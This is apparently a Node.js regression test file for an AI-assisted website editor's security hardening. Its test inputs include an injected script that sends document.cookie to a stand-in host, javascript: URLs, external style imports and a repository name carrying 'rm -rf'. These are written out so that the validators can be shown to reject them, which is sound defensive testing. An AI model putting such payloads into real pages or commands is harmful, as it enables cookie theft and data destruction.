'use strict';
// Regression tests for the editor security hardening: sessions, selectors, uploads, AI validation, review,
// branch protection on publish, the live-repo guard and the render deadline.
const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const http = require('http');
const path = require('path');
const { spawn } = require('child_process');
const { boot } = require('./helpers');

let T; let editor;
const PW = 'correct-horse-battery';
const PNG = Buffer.from('89504E470D0A1A0A0000000D49484452000000010000000108060000001F15C4890000000D49444154789C6360000002000154A24F5D0000000049454E44AE426082', 'hex');

before(async () => {
  T = boot();
  T.auth.createUser({ email: 'sec@t.test', name: 'Sec', role: 'editor', password: PW });
  editor = await T.client('sec@t.test', PW);
});
after(() => T.close());

const raw = (url, headers = {}) => fetch(T.E + url, { headers: { 'X-Requested-With': 'editor', Origin: T.E, ...headers } });
async function sessionToken() {
  const r = await fetch(T.E + '/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'editor', Origin: T.E }, body: JSON.stringify({ email: 'sec@t.test', password: PW }) });
  return r.headers.get('set-cookie').split(';')[0].split('=')[1];
}

test('a malformed %-escape in any cookie no longer returns 500', async () => {
  for (const url of ['/api/me', '/login.html', '/']) {
    const r = await raw(url, { Cookie: 'other=%E0%A4%A; tse_sid=%' });
    assert.ok(r.status < 500, `${url} → ${r.status}`);
  }
  const t = await sessionToken();
  assert.equal((await raw('/api/me', { Cookie: `junk=%zz; tse_sid=${t}` })).status, 200, 'a bad sibling cookie does not break a valid session');
});

test('duplicate session cookies: the first one wins, so a planted later cookie cannot replace the session', async () => {
  const t = await sessionToken();
  assert.equal((await raw('/api/me', { Cookie: `tse_sid=${t}; tse_sid=planted` })).status, 200);
  assert.equal((await raw('/api/me', { Cookie: `tse_sid=planted; tse_sid=${t}` })).status, 401);
});

test('the session cookie uses the __Host- prefix whenever cookies are Secure', () => {
  const src = require('fs').readFileSync(path.join(__dirname, '../src/auth.js'), 'utf8');
  assert.match(src, /SECURE_COOKIES \? '__Host-tse_sid' : 'tse_sid'/);
  assert.match(T.auth.cookieHeader('x', 60), /^tse_sid=x; Path=\/; HttpOnly; SameSite=Strict/); // tests run without Secure
});

test('viewer selectors are limited to the picker grammar and answer quickly', async () => {
  const { simpleSelector } = require('../src/sites');
  for (const ok of ['#main > section:nth-of-type(2)', 'body > header:nth-of-type(1) > nav:nth-of-type(1)', '#\\31 x > p:nth-of-type(3)', '.kicker'])
    assert.ok(simpleSelector(ok), ok);
  const heavy = Array(30).fill('*').join(' ') + ':has(*:has(*))';
  for (const bad of [heavy, 'a:not(b)', 'a ~ b', 'a + b', '[href]', 'div div', 'x'.repeat(401)]) assert.equal(simpleSelector(bad), false, bad);
  const reg = (await editor('/api/sites/threshold/registry')).body;
  const t0 = Date.now();
  const r = await editor('/api/sites/threshold/resolve', { method: 'POST', body: { sha: reg.sha, page: 'index.html', areaSelector: heavy, chain: [{ selector: heavy }] } });
  assert.equal(r.status, 400);
  assert.ok(Date.now() - t0 < 2000, 'refused without evaluating the selector');
  const ok = await editor('/api/sites/threshold/resolve', { method: 'POST', body: { sha: reg.sha, page: 'index.html', areaSelector: '#main > section:nth-of-type(1)', chain: [{ selector: '#main > section:nth-of-type(1)', sig: {} }] } });
  assert.notEqual(ok.status, 500, 'picker selectors still resolve');
});

test('upload edge cases are refused cleanly and the server stays up', async () => {
  const c = await editor('/api/requests', { method: 'POST', body: { siteId: 'threshold', page: 'lift.html', sectionIndex: 0, sectionKey: 'aria:h1', instruction: 'Upload edge cases test request.', status: 'draft' } });
  assert.equal(c.status, 201, JSON.stringify(c.body));
  const url = `/api/requests/${c.body.id}/attachments`;
  const form = (fn) => { const f = new FormData(); fn(f); return f; };
  const cases = {
    empty: form((f) => f.append('files', new Blob([]), 'a.png')),
    tooBig: form((f) => f.append('files', new Blob([PNG, Buffer.alloc(9 * 1024 * 1024)]), 'b.png')),
    wrongField: form((f) => f.append('other', new Blob([PNG]), 'c.png')),
    tooManyFields: form((f) => { for (let i = 0; i < 8; i++) f.append(`x${i}`, 'y'); f.append('files', new Blob([PNG]), 'd.png'); }),
    badPurposes: form((f) => { f.append('purposes', '{not json'); f.append('files', new Blob([PNG]), 'e.png'); }),
  };
  for (const [name, body] of Object.entries(cases)) {
    const r = await editor(url, { method: 'POST', body });
    assert.ok(r.status < 500, `${name} → ${r.status}`);
  }
  const broken = await fetch(T.E + url, { method: 'POST', headers: { 'X-Requested-With': 'editor', Origin: T.E, 'Content-Type': 'multipart/form-data; boundary=zz', Cookie: `tse_sid=${await sessionToken()}` }, body: '--zz\r\nContent-Disposition: form-data; name="files"; filename="x.png"\r\n\r\npartial' });
  assert.ok(broken.status < 500, `truncated multipart → ${broken.status}`);
  assert.equal((await editor('/api/me')).status, 200, 'server still running');
});

// ---------- AI output validation ----------
const { validateStatic } = require('../src/ai/validate');
const BASE = '<!doctype html><html><head><title>T</title></head><body><main id="main"><section><h1>Hello</h1><p><a href="a.html">Link</a></p></section></main><script>var a=1;</script></body></html>';
function secCheck(next) {
  const page = { path: 'index.html', title: 'Home', sections: [{ name: 'Hero' }] };
  const checks = validateStatic({
    cr: { area: { kind: 'section', index: 0 }, changeTypes: ['text'], protectedElements: [], protectedSections: [], allowSharedFiles: false },
    page, pages: [page], site: { sharedFiles: [], sectionSelector: '#main > section' }, area: { kind: 'section', index: 0, selector: '#main > section:nth-of-type(1)' },
    base: { 'index.html': BASE }, next: { 'index.html': next }, newFileList: ['index.html', 'a.html'], binaries: [], writable: new Set(['index.html']),
  });
  return checks.find((c) => c.id === 'sec:index.html');
}
test('AI validation refuses new inline scripts, script URLs in any case and external styles anywhere', () => {
  assert.equal(secCheck(BASE.replace('Hello', 'Hello there')).status, 'pass', 'a plain text edit passes');
  const bad = {
    'new inline script': BASE.replace('</h1>', '</h1><script>fetch("//x.test/?c="+document.cookie)</script>'),
    'changed inline script': BASE.replace('var a=1;', 'var a=1;location="//x.test"'),
    'JavaScript: upper case': BASE.replace('href="a.html"', 'href="JavaScript:alert(1)"'),
    'java\\tscript: with whitespace': BASE.replace('href="a.html"', 'href=" java\tscript:alert(1)"'),
    'form action': BASE.replace('<p>', '<p><form action="javascript:alert(1)"></form>'),
    'iframe srcdoc': BASE.replace('<p>', '<p><iframe srcdoc="<script>x</script>"></iframe>'),
    'style attribute url()': BASE.replace('<h1>', '<h1 style="background:url(https://x.test/p.png)">'),
    'plain <style> import': BASE.replace('</title>', '</title><style>@import "//x.test/a.css";</style>'),
  };
  for (const [name, html] of Object.entries(bad)) assert.equal(secCheck(html).status, 'fail', name);
  const json = BASE.replace('</h1>', '</h1><script type="application/ld+json">{"a":1}</script>');
  assert.equal(secCheck(json).status, 'pass', 'structured data is not treated as script');
});

// ---------- review screen ----------
test('the review screen lists changed link targets alongside text changes', async () => {
  const sites = require('../src/sites');
  const orig = { getSite: sites.getSite, getRegistry: sites.getRegistry, readFile: sites.readFile };
  const files = { base: BASE, next: BASE.replace('Hello', 'Hi').replace('href="a.html"', 'href="https://pay.x.test/"') };
  Object.assign(sites, { getSite: () => ({ id: 's', sectionSelector: '#main > section', sharedFiles: [] }), getRegistry: async () => ({ pages: [{ path: 'index.html', title: 'Home' }] }), readFile: async (_s, sha) => Buffer.from(files[sha]) });
  try {
    const { changeSummary } = require('../src/review');
    const s = await changeSummary({ request_snapshot: JSON.stringify({ siteId: 's', page: 'index.html' }), changed_files: '["index.html"]', base_sha: 'base', result_sha: 'next' });
    assert.ok(s.items.some((i) => i.kind === 'text'));
    assert.ok(s.items.some((i) => i.kind === 'link' && /pay\.x\.test/.test(i.text) && /was a\.html/.test(i.text)), JSON.stringify(s.items));
  } finally { Object.assign(sites, orig); }
});

// ---------- publishing ----------
test('publish never force-pushes the base branch or a non-editor branch', async () => {
  const { ship } = require('../src/publish');
  const site = { githubRepo: 'o/r', branch: 'main', repo: 'https://example.test/o/r.git' };
  for (const branch of ['main', 'refs/heads/main', 'feature/x', 'editor/../main', 'editor/r1-g1/x'])
    await assert.rejects(ship(site, 't', { commit: 'a'.repeat(40), branch, title: 't', body: '' }), /does not own/, branch);
  await assert.rejects(ship({ ...site, branch: 'editor/r1-g1' }, 't', { commit: 'a'.repeat(40), branch: 'editor/r1-g1', title: 't', body: '' }), /does not own/);
});

function runJob(spec) {
  return new Promise((resolve) => {
    const calls = [];
    const srv = http.createServer((req, res) => {
      let b = ''; req.on('data', (d) => { b += d; }); req.on('end', () => {
        calls.push(req.url); res.setHeader('content-type', 'application/json');
        res.end(JSON.stringify(req.url.endsWith('/spec') ? spec : { ok: true }));
      });
    }).listen(0, '127.0.0.1', () => {
      const p = spawn(process.execPath, [path.join(__dirname, '../runner/run-job.js')], { env: { ...process.env, JOB_ID: '7', EDITOR_API: `http://127.0.0.1:${srv.address().port}`, RUNNER_SECRET: 'x', GITHUB_ACTIONS: '' } });
      let err = ''; p.stderr.on('data', (d) => { err += d; });
      p.on('exit', (code) => { srv.close(); resolve({ code, err, calls }); });
    });
  });
}
test('runner refuses the live repository in any letter case, unsafe branches and non-editor publish branches', async () => {
  const site = { repo: 'KIPSTA341/Threshold-Website-Test', branch: 'main', pagesUrl: 'https://x.test/', sectionSelector: '#main > section' };
  const cases = [
    [{ ...site, repo: 'kipsta341/threshold-website' }, { id: 1 }, 'generate', /original Threshold/],
    [{ ...site, repo: 'KIPSTA341/THRESHOLD-WEBSITE.git' }, { id: 1 }, 'generate', /original Threshold/],
    [{ ...site, repo: 'a/b;rm -rf' }, { id: 1 }, 'generate', /Invalid repository/],
    [{ ...site, branch: 'editor/change-1' }, { id: 1 }, 'generate', /Invalid base branch/],
    [{ ...site, branch: '../x' }, { id: 1 }, 'generate', /Invalid base branch/],
    [site, { id: '1/../main' }, 'generate', /Invalid change id/],
    [site, { id: 1, branch: 'main' }, 'publish', /Invalid change branch/],
  ];
  for (const [s, change, kind, msg] of cases) {
    const r = await runJob({ kind, site: s, change, githubToken: 'ghs_dummy' });
    assert.equal(r.code, 1); assert.match(r.err, msg, JSON.stringify(s) + JSON.stringify(change));
    assert.deepEqual(r.calls, ['/runner/jobs/7/spec'], 'stopped before doing any work');
  }
});

// ---------- render deadline ----------
test('a preview that never finishes loading cannot hold the generation queue', async () => {
  process.env.RENDER_SNAPSHOT_TIMEOUT_MS = '300';
  delete require.cache[require.resolve('../src/ai/render')];
  const { snapshot } = require('../src/ai/render');
  let closed = false;
  const page = { on() {}, route: async () => {}, goto: () => new Promise(() => {}), evaluate: () => new Promise(() => {}), waitForTimeout: async () => {} };
  const browser = { newContext: async () => ({ newPage: async () => page, close: async () => { closed = true; } }) };
  const t0 = Date.now();
  await assert.rejects(snapshot(browser, 'http://127.0.0.1:1/x', { width: 800, height: 600 }, {}), /took too long/);
  assert.ok(Date.now() - t0 < 2000); assert.ok(closed, 'browser context closed');
  delete process.env.RENDER_SNAPSHOT_TIMEOUT_MS;
});
